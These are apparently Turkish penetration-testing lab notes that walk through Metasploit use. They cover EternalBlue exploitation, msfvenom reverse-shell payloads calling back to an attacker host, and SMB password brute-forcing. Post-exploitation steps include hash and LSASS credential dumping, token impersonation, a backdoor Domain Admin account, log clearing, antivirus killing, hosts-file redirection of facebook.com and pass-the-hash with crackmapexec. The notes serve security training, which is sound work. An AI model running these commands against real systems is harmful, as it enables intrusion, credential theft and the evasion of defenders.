# Giriş #
## Exploitler ##
  1. Remote Exploitler
  2. Local Exploitler
  3. Web Exploitleri
  4. DoS Exploitleri - Servis Dışı Bırakma
  5. 0day, 1day
  * PAYLOAD -> karşı tarafta nasıl sömüreceğiz? shell mi almak istiyoruz, firewall kuralları mı yazacağız, backdoor mu açacağız?

# METASPLOIT #
  - `msfupdate`
  - `msfdb init` update sonrası yapmak gerekiyor
  - `msfconsole` metasploit açıldı
  - `ctrl+l` satırı yukarı almak
  - `db_status` postgresql veritabanına bağlı mıyım
  - `workspace -a akademi` akademi çalışma ortamı oluşturuldu
  - `workspace -d akademi` silme
  - `workspace akademi2` gibi aralarında değişim yapılabilir.
  - `nmap 192.168.1.200 -oX 200.xml` metasploit kapalıyken tarama yapıp xml dosyası olarak çıktı aldık.
    - msfconsole'u açtık `db_import /root/200.xml` dosyası içeri aldık.
    - `hosts` diye aradığımda hemen çıkıyor
    - `services
  - `vulns` nessus taramasını da atıp buraya atıp zafiyetleri görebiliriz
---
  - `db_nmao 192.168.1.113 -sV` taramasını yaptık direkt olarak kaydedildi.
    - `hosts`
    - `services`
      - `services -h` help dosyası
      - `services -S vsftp` vsftp içerenleri getir
      - `services -S http` http yerine tcp veya udp de yazılabilir.
  - `help`
  - `search ms17-010` ms17-010 zafiyeti ile ilgili bir şey var mı diye aratıyoruz
    - `info 1` 1 numaralı zafiyetin bilgileri
    - `use 1` 
       - `options` RPORT 445, RHOSTS boş
       - `set THREADS 10` 10 thread'te tara
       - `set RHOSTS 192.168.1.200` tek bir hedef belirledik 
       - `services -p 445` 445 portu açık olanlar neler?
       - `services -p 445 -R` böyle yaparak direkt olarak sonucu RHOSTS'a ekledik
       - `run` exploit çalıştı. zafiyet olup olmadığını söyledi.  (VULNERABLE- Host does NOT appear vulnerable)
       - `back` modülden çıktık
  - `search ms17-010` tekrar. eternalblue olanı seçicez
    - `use 2`
    - `options`
    - `set RHOSTS 192.168.1.200`
    - `show targets` windows 7 r2'de çalışıyor sadece
    - _Payload options (windows/x64/meterpreter/reverse_tcp):_  bu zaten default olarak geldi
    - `show payloads` 
      - bind_tcp ile reverse_tcp farkı nedir?
      - Reverse Shell: zafiyeti sömür ve sisteme "ben seni kendi makinemde 4444'te bekliyorum gel bana bağlan ve komut satırını ver" veya meterpretere içeri girdiğini söyle buradan konuşalım diyor.
      - Bind Shell: Karşıdaki zafiyeti sömürdük ve karşı makinede bir port açıyoruz. Biz o porta gidiyoruz. 
      - Neden bunlara ihtiyaç duyuluyor. firewall olsa arada reverse burada daha iyi. 
    - `set PAYLOAD windows/x64/meterpreter/bind_tcp`
    - `run`
    - olmadı `search ms17` diyip başka bir modül seçiyoruz
    - `use 10`
    - `options`
    - `show targets`
    - `set RHOSTS 192.168.1.200`
    - `run` BAĞLANDIK ve shell aldık _meterpreter açıldı_
    - `sysinfo` ile makine bilgilerini aldık. 
    - `background` 
    - `sessions -k 1` 1. oturumu öldür, siler.
    - `sessions -K` tüm oturumları kapatır

# msfvenom #
  * zafiyet bulamadık dolaylı olarak sömürmeye çalışacağız.
  * `msfvenom -h payloads`
  * ![resim](https://user-images.githubusercontent.com/63648396/147675129-41495224-a982-461b-b25c-b4b5b78d5b5c.png)
---
  * `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.112 lport=443 -f exe > ck.exe` payload üretimi
    *  Payloadu farklı bir tab'da ürettik
    *  ![resim](https://user-images.githubusercontent.com/63648396/147675546-15811bc6-f981-4cac-b95a-63bff016f32a.png)

  * `use exploit/multi/handler`
    * `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
    * `set LHOST 192.168.1.112`
    * `set LPORT 443`
    * `options`
    * farklı bir tab ![resim](https://user-images.githubusercontent.com/63648396/147675458-2ed06845-ee29-4138-a6a6-1af8b1af9b69.png)
    * `exploit -j` java olarak çalışıyor.
---
  - `msfvenom -p /linux/x86/meterpreter/reverse_tcp lhost=192.168.1.112 lport=443 -f elf > ck.elf`
  - `msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.113 lport=443 -f raw > ck.php`
  - `chmod +x ck.php` yan tarafta da handler çalışıyor. yukarıda set payload falan dediğimiz exploit -j dediğimiz kısımlar. farklı tab
  - `./ck.php`
  - ![resim](https://user-images.githubusercontent.com/63648396/147675957-892312db-a5b1-4512-a884-74bc9e798413.png)
  - session açıldı ![resim](https://user-images.githubusercontent.com/63648396/147676016-8aa5d9c5-94b4-4673-89e3-30240b402459.png)
    - buradan artık `sessions` yazıp geldiğini gördük. `sessions <number>` ile o oturuma geçtik. shell geldi ve `sysinfo`, `ls` gibi komutları çalıştırıp baktık.
    - eğer ki basit komutlar çalışmıyorsa `stdapi` komutunu deneyebiliriz.

---
# Brute-force #
  - `cd /usr/share/wordlists/metasploit`
  - `cp adobe_top100_pass.txt ~/passlist` sonra ana dizine gittik
  - `search smb_login`
  - `use 0`
  - `options`
  - `services -p 445` 445'i açık olan tüm sistemleri göster.
  - `services -p 445 -R` bir önceki aramada çıkanları RHOSTS olarak ayarla
  - `set PASS_FILE /home/sacrum/passlist`
  - `nano userlist` bir dosya daha oluşturduk içine kullanıcı isimlerini yazdık.
  - bunların dışında domain vermemiz gerekiyor. kendi domainimizi nasıl buluruz? ![resim](https://user-images.githubusercontent.com/63648396/147677399-79ebc48e-4779-446a-a29d-40100c75ed84.png)
  - `set SMBDOMAIN BTKAKADEMI` yazabiliriz ama 101 parolayı buradan yollarsak bir anomali yaratırız. sorun olduğu belli olur.
  - local makinede denesin istiyoruz. bunun için de SMBDOMAIN kısmının `.` olarak kalması yeterli.
  - `set USER_FILE /home/sacrum/userlist`
  - `set THREADS 10`
  -  `set STOP_ON_SUCCESS true` başarılı olduğunda dur.
  -  ![resim](https://user-images.githubusercontent.com/63648396/147677706-a496792a-2ef5-4bd6-8dd6-09724252c669.png)
  -  `run`
  -  `search psexec`
  -  ![resim](https://user-images.githubusercontent.com/63648396/147677851-7f035859-e7b3-4e26-9312-19ad91af4548.png)
  -  _medusa, hydra_ gibi araçları da araştır.

# POST EXPLOIT # 
  - `sysinfo` sistem hakkında bilgi
  - `getuid` ben kimim
  - `getsystem` en yüksek yetkilendirmeye ben geçebiliyor muyum?
  - `getuid` server username: NT AUTHORITY\SYSTEM
  - `shell` 
  - `netusers` kullanıcılar
  - `exit` shell'den meterpretere geri döndük 
  - `hashdump` kullanıcı hashleri, bunları alıp bir yerde sakla _pass the hash saldırıları_ için kullanılabilir
  - `migrate -N lsass.exe` 
  -  `load kiwi` RAM'DEN PAROLA ÇEKTİK - alternatifi _mimikatz_
  -  `creds_all`
    - bir şey çıkmadı ama çıkadabilirdi.
    - ![resim](https://user-images.githubusercontent.com/63648396/147678625-7727be12-362a-4ae5-8bed-5fc024c8c480.png)
  - `load incognito` hedefteki tokenlara bakılabilir
    - `list_tokens -u`
    - `impersonate_token BTKAKADEMI\\Administrator` yazarak tokenleri üstümüze alabiliriz.
    - aldıktan sonra tekrar `shell` diyebiliriz.
  - `net user CK Passwd123! /add /domain` Passwd123! parolaydı. token yetkisi devam ediyorsa komutu çalıştırabiliriz.
  - `net group 'Domain Admins' CK /add /domain` artık tüm networkte sınırsız yetkisi olan bir CK kullanıcısı var.
  - `getsystem`
  - `screenshot`
  - `upload /home/sacrum/ck.php C:\\`
  - `download C:\\ck.php /tmp/` 
  - `run post` post exploitler
  - `run post/windows/gather/enum_applications` makinede yüklü olan uygulamalar
  - `run post/windows/gather/enum_domain` domainleri getiriyor.
  - `run post/windows/gather/credentials/` çift tab yapıp neler olduğuna baktık
  - meterpreter içinde `help`
  - `clearev` tüm logları siliyor
  - `run post/windows/manage/killav` 
  - `run post/windows/manage/enable_rdp`
  - `run hostsedit -e 7.7.7.7,facebook.com` kullanıcı adı parola girince direkt bize gelecek.

---
  - `hashdump` sonuçlarını aldık
  - `nano hashlist` içerisine yapıştırdık.
  - `cat hashlist | cut -d ":" -f 3,4 > hashlist2` hashi ayıkladık
  - meterpreterden çıktık `background` ile
  - `search smb_login`
    - `use 0`
    - `set PASS_FILE /home/sacrum/hashlist2`
    - `options` 
    - ![resim](https://user-images.githubusercontent.com/63648396/147686276-a7bbe9d7-f97c-4519-b19a-b0f3ed96a86a.png)
    - `set RHOSTS 192.168.1.150`
    - `run`
    - `set RHOSTS 192.168.1.200` başka makinede deniyoruz
    - `set STOP_ON_SUCCESS false`
    - `run`
    - ![resim](https://user-images.githubusercontent.com/63648396/147686443-9c47c29b-eada-436a-b65d-e7215f9b3907.png)
    - `set RHOSTS 192.168.1.0/24` yapıp hepsini deneyebiliriz
      -  `db_nmap -p 445 192.168.1.0/25 --open` der bunları kaydederiz
      -  `services -p 445 -R` 445'i açık olan hepsini RHOSTS'a alırız
      -  ama bu tür saldırılarda karşı hesapları kilitlememek çok önemli

---
## crackmapexec ##
  - `crackmapexec smb 192.168.1.200 -u Administrator -H <hash>` hash bu ip üzerinde herhangi bir şekilde administrator kapısını bize açıyor mu?
  - `crackmapexec smb 192.168.1.200 -u Administrator -H <hash> -lsass`
  - `crackmapexec smb 192.168.1.200 -u Administrator -H <hash> --sam`
  - ![resim](https://user-images.githubusercontent.com/63648396/147686649-2650d549-3f9a-4453-b1a5-b03729f79fc0.png)
  - - `crackmapexec smb 192.168.1.0/24 -d . -u Administrator -H <hash> --sam` -d . çok önemli
  - 


    
 

    




     






















